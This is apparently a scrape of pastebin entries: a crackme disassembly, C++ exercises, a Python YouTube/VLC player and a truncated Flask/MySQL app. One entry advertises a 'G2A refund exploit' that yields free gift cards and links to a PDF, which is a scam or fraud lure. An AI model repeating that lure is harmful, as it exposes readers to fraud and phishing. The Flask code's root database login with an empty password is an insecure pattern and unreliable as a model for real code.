id,title,username,language,date,content
T9DgP9wW,disassembly,fooker,MIX Assembler,Saturday 16th of March 2024 01:03:40 AM CDT,"prog:     file format elf64-x86-64


Disassembly of section .text:

0000000000401000 <_start>:
  401000:       4c 8d 14 25 6b 11 40    lea    r10,ds:0x40116b
  401007:       00
  401008:       41 bb 06 00 00 00       mov    r11d,0x6
  40100e:       e8 00 00 00 00          call   401013 <_start+0x13>
  401013:       58                      pop    rax
  401014:       48 83 c0 0a             add    rax,0xa
  401018:       e9 a6 00 00 00          jmp    4010c3 <print>
  40101d:       58                      pop    rax
  40101e:       48 83 ec 20             sub    rsp,0x20
  401022:       49 89 e2                mov    r10,rsp
  401025:       41 bb 19 00 00 00       mov    r11d,0x19
  40102b:       e8 00 00 00 00          call   401030 <_start+0x30>
  401030:       58                      pop    rax
  401031:       48 83 c0 0a             add    rax,0xa
  401035:       e9 9f 00 00 00          jmp    4010d9 <read>
  40103a:       58                      pop    rax
  40103b:       48 8d 04 25 5f 10 40    lea    rax,ds:0x40105f
  401042:       00
  401043:       50                      push   rax
  401044:       50                      push   rax
  401045:       48 8d 04 25 5d 10 40    lea    rax,ds:0x40105d
  40104c:       00
  40104d:       48 89 e5                mov    rbp,rsp
  401050:       48 8d 24 25 f1 10 40    lea    rsp,ds:0x4010f1
  401057:       00
  401058:       e9 94 00 00 00          jmp    4010f1 <key>

000000000040105d <_start.continuation>:
  40105d:       c9                      leave
  40105e:       c3                      ret

000000000040105f <correct>:
  40105f:       4c 8d 14 25 71 11 40    lea    r10,ds:0x401171
  401066:       00
  401067:       41 bb 09 00 00 00       mov    r11d,0x9
  40106d:       e8 00 00 00 00          call   401072 <correct+0x13>
  401072:       58                      pop    rax
  401073:       48 83 c0 07             add    rax,0x7
  401077:       eb 4a                   jmp    4010c3 <print>
  401079:       58                      pop    rax
  40107a:       e8 2c 00 00 00          call   4010ab <exit>

000000000040107f <incorrect>:
  40107f:       4c 8d 14 25 7a 11 40    lea    r10,ds:0x40117a
  401086:       00
  401087:       41 bb 09 00 00 00       mov    r11d,0x9
  40108d:       b8 01 00 00 00          mov    eax,0x1
  401092:       bf 01 00 00 00          mov    edi,0x1
  401097:       4c 89 d6                mov    rsi,r10
  40109a:       4c 89 da                mov    rdx,r11
  40109d:       0f 05                   syscall
  40109f:       eb 0a                   jmp    4010ab <exit>

00000000004010a1 <syscall>:
  4010a1:       55                      push   rbp
  4010a2:       48 89 e5                mov    rbp,rsp
  4010a5:       48 83 ec 40             sub    rsp,0x40
  4010a9:       0f 05                   syscall

00000000004010ab <exit>:
  4010ab:       b8 4a 00 00 00          mov    eax,0x4a
  4010b0:       bf 01 00 00 00          mov    edi,0x1
  4010b5:       0f 05                   syscall
  4010b7:       b8 3c 00 00 00          mov    eax,0x3c
  4010bc:       bf 00 00 00 00          mov    edi,0x0
  4010c1:       0f 05                   syscall

00000000004010c3 <print>:
  4010c3:       50                      push   rax
  4010c4:       b8 01 00 00 00          mov    eax,0x1
  4010c9:       bf 01 00 00 00          mov    edi,0x1
  4010ce:       4c 89 d6                mov    rsi,r10
  4010d1:       4c 89 da                mov    rdx,r11
  4010d4:       0f 05                   syscall
  4010d6:       58                      pop    rax
  4010d7:       ff d0                   call   rax

00000000004010d9 <read>:
  4010d9:       50                      push   rax
  4010da:       b8 00 00 00 00          mov    eax,0x0
  4010df:       bf 00 00 00 00          mov    edi,0x0
  4010e4:       4c 89 d6                mov    rsi,r10
  4010e7:       4c 89 da                mov    rdx,r11
  4010ea:       0f 05                   syscall
  4010ec:       58                      pop    rax
  4010ed:       ff d0                   call   rax
  4010ef:       c9                      leave
  4010f0:       c3                      ret

00000000004010f1 <key>:
  4010f1:       49 89 c6                mov    r14,rax
  4010f4:       41 b8 00 00 00 00       mov    r8d,0x0
  4010fa:       b8 00 00 00 00          mov    eax,0x0
  4010ff:       48 8d 1c 25 0e 11 40    lea    rbx,ds:0x40110e
  401106:       00

0000000000401107 <key.funny>:
  401107:       66 b8 48 31             mov    ax,0x3148
  40110b:       f9                      stc
  40110c:       ff e3                   jmp    rbx

000000000040110e <key.loop>:
  40110e:       41 88 c1                mov    r9b,al
  401111:       4d 0f b6 c9             movzx  r9,r9b
  401115:       42 8a 0c 0c             mov    cl,BYTE PTR [rsp+r9*1]
  401119:       43 8a 3c 10             mov    dil,BYTE PTR [r8+r10*1]
  40111d:       48 8d 1d 0a 00 00 00    lea    rbx,[rip+0xa]        # 40112e <key.continuation>
  401124:       4c 8d 0d de ff ff ff    lea    r9,[rip+0xffffffffffffffde]        # 401109 <key.funny+0x2>
  40112b:       41 ff e1                jmp    r9

000000000040112e <key.continuation>:
  40112e:       41 8a b8 83 11 40 00    mov    dil,BYTE PTR [r8+0x401183]
  401135:       40 38 f9                cmp    cl,dil
  401138:       0f 85 41 ff ff ff       jne    40107f <incorrect>
  40113e:       66 a9 01 00             test   ax,0x1
  401142:       74 18                   je     40115c <key.even>

0000000000401144 <key.odd>:
  401144:       66 89 c3                mov    bx,ax
  401147:       66 d1 e0                shl    ax,1
  40114a:       66 01 d8                add    ax,bx
  40114d:       66 ff c0                inc    ax
  401150:       49 ff c0                inc    r8
  401153:       49 83 f8 18             cmp    r8,0x18
  401157:       7c b5                   jl     40110e <key.loop>
  401159:       41 ff e6                jmp    r14

000000000040115c <key.even>:
  40115c:       66 d1 e8                shr    ax,1
  40115f:       49 ff c0                inc    r8
  401162:       49 83 f8 18             cmp    r8,0x18
  401166:       7c a6                   jl     40110e <key.loop>
  401168:       41 ff e6                jmp    r14

000000000040116b <prompt>:
  40116b:       66 6c                   data16 ins BYTE PTR es:[rdi],dx
  40116d:       61                      (bad)
  40116e:       67 3f                   addr32 (bad)
  401170:       20                      .byte 0x20

0000000000401171 <correct_msg>:
  401171:       63 6f 72                movsxd ebp,DWORD PTR [rdi+0x72]
  401174:       72 65                   jb     4011db <data+0x58>
  401176:       63 74 21 0a             movsxd esi,DWORD PTR [rcx+riz*1+0xa]

000000000040117a <incorrect_msg>:
  40117a:       77 72                   ja     4011ee <data+0x6b>
  40117c:       6f                      outs   dx,DWORD PTR ds:[rsi]
  40117d:       6e                      outs   dx,BYTE PTR ds:[rsi]
  40117e:       67 20 3a                and    BYTE PTR [edx],bh
  401181:       28 0a                   sub    BYTE PTR [rdx],cl

0000000000401183 <data>:
  401183:       f2 0f 6c                (bad)
  401186:       ec                      in     al,dx
  401187:       1a e2                   sbb    ah,dl
  401189:       57                      push   rdi
  40118a:       70 70                   jo     4011fc <data+0x79>
  40118c:       86 ea                   xchg   dl,ch
  40118e:       ba b5 63 cf 8c          mov    edx,0x8ccf63b5
  401193:       f8                      clc
  401194:       0b 6c e0 6e             or     ebp,DWORD PTR [rax+riz*8+0x6e]
  401198:       15                      .byte 0x15
  401199:       53                      push   rbx
  40119a:       45                      rex.RB"
rRfdjq3F,Untitled,35657,C++,Saturday 16th of March 2024 12:36:25 AM CDT,"#include <iostream>

using namespace std;

void get_roots(double a, double b, double c) {
    double discriminant = b * b - 4 * a * c;

    if (discriminant < 0) {
        cout << ""Уравнение не имеет корней"" << endl;
        return;
    }
    else if (discriminant == 0) {
        cout << ""x = "" << -b / (2 * a) << endl;
        return;
    }
    else {
        cout << ""x1 = "" << (-b + sqrt(discriminant)) / (2 * a) << endl;
        cout << ""x2 = "" << (-b - sqrt(discriminant)) / (2 * a) << endl;
    }
}

void get_roots(double a, double b) {
    cout << ""x = "" << -b / a << endl;
}



int main() {

    setlocale(LC_ALL, ""ru"");

    get_roots(2, 6, 4);
    get_roots(6, -2);
}
"
UdnS6apd,YOUTUBE-VLC-DOWNLOAD3.py,Najeebsk,Python,Saturday 16th of March 2024 12:35:40 AM CDT,"import tkinter as tk
import vlc
from youtube_search import YoutubeSearch
from pytube import YouTube
from pytube.exceptions import AgeRestrictedError
import webbrowser

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Create a VLC instance
        self.player = self.instance.media_player_new()  # Create a media player
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play, bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color, fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.page = 1
        self.per_page = 10

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_page, bg=self.button_color, fg=self.text_color)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_page, bg=self.button_color, fg=self.text_color)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color, fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color, fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        # Load saved video list when the application starts
        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=self.per_page*self.page).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            try:
                # Use pytube to get the video URL
                yt = YouTube(video_url)
                video_url = yt.streams.filter(progressive=True, file_extension='mp4').first().url

                media = self.instance.media_new(video_url)
                self.player.set_media(media)
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.player.play()
                self.current_video_label.config(text=f""Playing: {title}"")
            except AgeRestrictedError:
                print(""Age restricted video:"", video_url)
                webbrowser.open(video_url)  # Open age-restricted videos in the default web browser
            except Exception as e:
                print(""Error:"", e)
                self.current_video_label.config(text=""An error occurred while playing the video."")
        else:
            print(""No video selected."")

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):
        if hasattr(self, ""download_button""):
            self.download_button.destroy()  # Remove existing download button if any

        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary

            # Display download button after stop button
            self.download_button = tk.Button(self.button_frame, text=""Download 360p"", command=lambda: self.download_video(video_url), bg=self.button_color, fg=self.text_color)
            self.download_button.pack(side=""left"", padx=5, pady=5, after=self.stop_button)

    def download_video(self, video_url):
        try:
            yt = YouTube(video_url)
            stream = yt.streams.filter(res=""360p"", progressive=True).first()  # Filter for 360p quality
            if stream:
                stream.download()
                print(""Downloaded successfully."")
            else:
                print(""No 360p stream available for download."")
        except Exception as e:
            print(""Error occurred during download:"", e)

    def prev_page(self):
        if self.page > 1:
            self.page -= 1
            self.search_and_play()

    def next_page(self):
        self.page += 1
        self.search_and_play()

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""Najeeb VLC Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
trUKd8F2,YOUTUBE-VLC-DOWNLOAD2.py,Najeebsk,Python,Saturday 16th of March 2024 12:32:55 AM CDT,"import tkinter as tk
import vlc
from youtube_search import YoutubeSearch
from pytube import YouTube
from pytube.exceptions import AgeRestrictedError
import webbrowser

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Create a VLC instance
        self.player = self.instance.media_player_new()  # Create a media player
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play, bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color, fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.page = 1
        self.per_page = 10

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_page, bg=self.button_color, fg=self.text_color)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_page, bg=self.button_color, fg=self.text_color)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color, fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color, fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.time_label = tk.Label(root, text="""", bg=self.bg_color, fg=self.text_color)
        self.time_label.pack(pady=5)

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        # Load saved video list when the application starts
        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=self.per_page*self.page).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            try:
                # Use pytube to get the video URL
                yt = YouTube(video_url)
                video_url = yt.streams.filter(progressive=True, file_extension='mp4').first().url

                media = self.instance.media_new(video_url)
                self.player.set_media(media)
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.player.play()
                self.current_video_label.config(text=f""Playing: {title}"")
                self.update_time_label()  # Update video timing display
            except AgeRestrictedError:
                print(""Age restricted video:"", video_url)
                webbrowser.open(video_url)  # Open age-restricted videos in the default web browser
            except Exception as e:
                print(""Error:"", e)
                self.current_video_label.config(text=""An error occurred while playing the video."")
        else:
            print(""No video selected."")

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):
        if hasattr(self, ""download_button""):
            self.download_button.destroy()  # Remove existing download button if any

        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary

            # Display download button after stop button
            self.download_button = tk.Button(self.button_frame, text=""Download 360p"", command=lambda: self.download_video(video_url), bg=self.button_color, fg=self.text_color)
            self.download_button.pack(side=""left"", padx=5, pady=5, after=self.stop_button)

    def download_video(self, video_url):
        try:
            yt = YouTube(video_url)
            stream = yt.streams.filter(res=""360p"", progressive=True).first()  # Filter for 360p quality
            if stream:
                stream.download()
                print(""Downloaded successfully."")
            else:
                print(""No 360p stream available for download."")
        except Exception as e:
            print(""Error occurred during download:"", e)

    def prev_page(self):
        if self.page > 1:
            self.page -= 1
            self.search_and_play()

    def next_page(self):
        self.page += 1
        self.search_and_play()

    def update_time_label(self):
        current_time = self.player.get_time() / 1000  # Convert to seconds
        duration = self.player.get_length() / 1000  # Convert to seconds

        current_time_formatted = self.format_time(current_time)
        duration_formatted = self.format_time(duration)

        self.time_label.config(text=f""{current_time_formatted} / {duration_formatted}"")
        self.root.after(1000, self.update_time_label)  # Update every second

    def format_time(self, time_seconds):
        minutes = int(time_seconds // 60)
        seconds = int(time_seconds % 60)
        return f""{minutes:02}:{seconds:02}""

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""Najeeb VLC Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
TBbuJsKT,YOUTUB-VLC-DOWNLOAD.py,Najeebsk,Python,Saturday 16th of March 2024 12:31:56 AM CDT,"import tkinter as tk
import vlc
from youtube_search import YoutubeSearch
from pytube import YouTube
from pytube.exceptions import AgeRestrictedError
import webbrowser

class VideoPlayer:
    def __init__(self, root):
        self.root = root
        self.instance = vlc.Instance('--no-xlib')  # Create a VLC instance
        self.player = self.instance.media_player_new()  # Create a media player
        self.video_urls = {}  # Initialize video URL dictionary

        # Color Palette
        self.bg_color = ""#336699""
        self.button_color = ""#4CAF50""
        self.text_color = ""white""

        self.main_frame = tk.Frame(root, bg=self.bg_color)
        self.main_frame.pack(fill=""both"", expand=True)

        self.title_label = tk.Label(self.main_frame, text=""NAJEEB VIDEO PLAYER"", font=(""Arial"", 24, ""bold""), fg=self.text_color, bg=self.bg_color)
        self.title_label.pack(pady=10)

        self.search_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.search_frame.pack(fill=""x"")

        self.search_entry = tk.Entry(self.search_frame)
        self.search_entry.pack(side=""left"", fill=""x"", expand=True, padx=5, pady=5)

        self.search_button = tk.Button(self.search_frame, text=""Search YouTube"", command=self.search_and_play, bg=self.button_color, fg=self.text_color)
        self.search_button.pack(side=""left"", padx=5, pady=5)

        self.save_button = tk.Button(self.search_frame, text=""Save"", command=self.save_results, bg=self.button_color, fg=self.text_color)
        self.save_button.pack(side=""left"", padx=5, pady=5)

        self.list_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.list_frame.pack(side=""left"", fill=""both"", expand=False)

        self.button_frame = tk.Frame(self.main_frame, bg=self.bg_color)
        self.button_frame.pack(side=""bottom"", fill=""x"")

        self.lst = tk.Listbox(self.list_frame, width=30, height=20, bg=self.bg_color, fg=self.text_color)
        self.lst.pack(side=""left"", fill=""both"", expand=True)

        self.scrollbar = tk.Scrollbar(self.list_frame, orient=""vertical"", command=self.lst.yview)
        self.scrollbar.pack(side=""right"", fill=""y"")
        self.lst.config(yscrollcommand=self.scrollbar.set)

        self.page = 1
        self.per_page = 10

        self.prev_button = tk.Button(self.button_frame, text=""Prev"", command=self.prev_page, bg=self.button_color, fg=self.text_color)
        self.prev_button.pack(side=""left"", padx=5, pady=5)

        self.next_button = tk.Button(self.button_frame, text=""Next"", command=self.next_page, bg=self.button_color, fg=self.text_color)
        self.next_button.pack(side=""left"", padx=5, pady=5)

        self.play_button = tk.Button(self.button_frame, text=""Play"", command=self.play_video, bg=self.button_color, fg=self.text_color)
        self.play_button.pack(side=""left"", padx=5, pady=5)

        self.stop_button = tk.Button(self.button_frame, text=""Stop"", command=self.stop_video, bg=self.button_color, fg=self.text_color)
        self.stop_button.pack(side=""left"", padx=5, pady=5)

        self.current_video_label = tk.Label(root, text=""No video selected"", bg=self.bg_color, fg=self.text_color)
        self.current_video_label.pack(pady=5)

        self.time_label = tk.Label(root, text="""", bg=self.bg_color, fg=self.text_color)
        self.time_label.pack(pady=5)

        self.slider = tk.Scale(root, from_=0, to=100, orient=""horizontal"", bg=self.bg_color, fg=self.text_color, command=self.set_video_position)
        self.slider.pack(fill=""x"")

        self.player_frame = tk.Frame(self.main_frame)
        self.player_frame.pack(side=""right"", fill=""both"", expand=True)

        self.lst.bind(""<<ListboxSelect>>"", self.show_video)

        # Load saved video list when the application starts
        self.load_saved_results()

    def search_and_play(self):
        query = self.search_entry.get()
        search_results = YoutubeSearch(query, max_results=self.per_page*self.page).to_dict()
        if search_results:
            self.lst.delete(0, tk.END)
            for result in search_results:
                video_title = result['title']
                video_url = 'https://www.youtube.com' + result['url_suffix']
                self.lst.insert(tk.END, video_title)
                self.video_urls[video_title] = video_url  # Store title and URL in dictionary
            self.save_results()  # Save updated list of videos

    def play_video(self):
        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary
            print(""Playing video:"", video_url)  # Print URL for debugging

            try:
                # Use pytube to get the video URL
                yt = YouTube(video_url)
                video_url = yt.streams.filter(progressive=True, file_extension='mp4').first().url

                media = self.instance.media_new(video_url)
                self.player.set_media(media)
                self.player.set_hwnd(self.player_frame.winfo_id())
                self.player.play()
                self.current_video_label.config(text=f""Playing: {title}"")
                self.update_time_label()  # Update video timing display
                self.update_slider()  # Update video slider position
            except AgeRestrictedError:
                print(""Age restricted video:"", video_url)
                webbrowser.open(video_url)  # Open age-restricted videos in the default web browser
            except Exception as e:
                print(""Error:"", e)
                self.current_video_label.config(text=""An error occurred while playing the video."")
        else:
            print(""No video selected."")

    def stop_video(self):
        self.player.stop()
        self.current_video_label.config(text=""Video stopped"")

    def save_results(self):
        with open(""YouTube_list.txt"", ""a"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
            for title, url in self.video_urls.items():
                file.write(f""{title}: {url}\n"")

    def load_saved_results(self):
        try:
            with open(""YouTube_list.txt"", ""r"", encoding=""utf-8"") as file:  # Specify UTF-8 encoding
                for line in file:
                    if ':' in line:
                        title, url = line.strip().split(': ', 1)
                        self.video_urls[title] = url
                        self.lst.insert(tk.END, title)
        except FileNotFoundError:
            print(""No saved results found."")

    def show_video(self, event):
        if hasattr(self, ""download_button""):
            self.download_button.destroy()  # Remove existing download button if any

        if self.lst.curselection():
            title = self.lst.get(self.lst.curselection())
            video_url = self.video_urls.get(title)  # Get URL from dictionary

            # Display download button after stop button
            self.download_button = tk.Button(self.button_frame, text=""Download 360p"", command=lambda: self.download_video(video_url), bg=self.button_color, fg=self.text_color)
            self.download_button.pack(side=""left"", padx=5, pady=5, after=self.stop_button)

    def download_video(self, video_url):
        try:
            yt = YouTube(video_url)
            stream = yt.streams.filter(res=""360p"", progressive=True).first()  # Filter for 360p quality
            if stream:
                stream.download()
                print(""Downloaded successfully."")
            else:
                print(""No 360p stream available for download."")
        except Exception as e:
            print(""Error occurred during download:"", e)

    def prev_page(self):
        if self.page > 1:
            self.page -= 1
            self.search_and_play()

    def next_page(self):
        self.page += 1
        self.search_and_play()

    def update_time_label(self):
        current_time = self.player.get_time() / 1000  # Convert to seconds
        duration = self.player.get_length() / 1000  # Convert to seconds

        current_time_formatted = self.format_time(current_time)
        duration_formatted = self.format_time(duration)

        self.time_label.config(text=f""{current_time_formatted} / {duration_formatted}"")
        self.root.after(1000, self.update_time_label)  # Update every second

    def update_slider(self):
        current_time = self.player.get_time() / 1000  # Convert to seconds
        duration = self.player.get_length() / 1000  # Convert to seconds

        if duration > 0:
            slider_position = (current_time / duration) * 100
            self.slider.set(slider_position)

        self.root.after(1000, self.update_slider)  # Update every second

    def set_video_position(self, value):
        duration = self.player.get_length() / 1000  # Convert to seconds
        target_time = (float(value) / 100) * duration
        self.player.set_time(int(target_time * 1000))  # Convert to milliseconds

    def format_time(self, time_seconds):
        minutes = int(time_seconds // 60)
        seconds = int(time_seconds % 60)
        return f""{minutes:02}:{seconds:02}""

root = tk.Tk()
root.geometry(""800x600+300+50"")
root.title(""Najeeb VLC Player"")
root.configure(bg=""#336699"")
video_player = VideoPlayer(root)
root.mainloop()
"
jnTbya8N,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Saturday 16th of March 2024 12:12:12 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_216438.pdf

Working as of:
16 March 2024"
sgJY0ved,Untitled,35657,C++,Friday 15th of March 2024 11:52:44 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
T Abs(T num) {
    return num < 0 ? -num : num;
}



int main() {

    setlocale(LC_ALL, ""ru"");

    cout << Abs(-1) << endl;
    cout << Abs(5.35) << endl;
    cout << Abs(-4.2) << endl;
}
"
FTrKum8e,Untitled,35657,C++,Friday 15th of March 2024 11:45:59 PM CDT,"#include <iostream>

using namespace std;

template <typename T>
T Max(T left, T right) {
    return left > right ? left : right;
}



int main() {

    setlocale(LC_ALL, ""ru"");

    int a = 5, b = 4;

    double c = 5.7, d = 9.4;

    cout << Max(a, b) << endl;
    cout << Max(c, d) << endl;
}
"
bAV3aAGD,app.py,anandaraufm,Python,Friday 15th of March 2024 11:45:43 PM CDT,"from flask import Flask, render_template, request, redirect, url_for,make_response
import pdfkit
import mysql.connector
# Path dan konfigurasi
path_wkhtmltopdf = r'C:\Program Files (x86)\wkhtmltopdf\bin'
config = pdfkit.configuration(wkhtmltopdf=path_wkhtmltopdf)
app = Flask(__name__)



def get_data_from_daftarkomoditas():
    try:
        # Koneksi ke database
        mydb = mysql.connector.connect(
            host=""localhost"",
            user=""root"",
            password="""",
            database=""testinterview_dbkomoditas""
        )
        cursor = mydb.cursor()

        # Query untuk mengambil data dari tabel
        query = ""SELECT * FROM daftar_komoditas""
        cursor.execute(query)

        # Mengambil hasil query
        result = cursor.fetchall()

        # Menutup koneksi
        cursor.close()
        mydb.close()

        return result
    except Exception as e:
        print(""Error:"", e)
        return None
# Fungsi untuk mendapatkan data komoditas dari database

def get_data_komoditas():
    mydatabase = mysql.connector.connect(
        host='localhost',
        user='root',
        passwd='',
        database='testinterview_dbkomoditas'
    )
    mycursor = mydatabase.cursor()
    mycursor.execute(""SELECT * FROM daftar_produksi"")
    data= mycursor.fetchall()
    mycursor.close()
    mydatabase.close()
    return data
def get_data_produksi():
    mydatabase = mysql.connector.connect(
        host='localhost',
        user='root',
        passwd='',
        database='testinterview_dbkomoditas'
    )
    mycursor = mydatabase.cursor()
    mycursor.execute(""SELECT komoditas_kode,tanggal,nama_komoditas,jumlah FROM daftar_produksi"")
    data= mycursor.fetchall()
    mycursor.close()
    mydatabase.close()
    return data
@app.route('/')
def beranda():
    alert = request.args.get('alert')
    # Mengambil data dari database
    data = get_data_from_daftarkomoditas()
    if data is None:
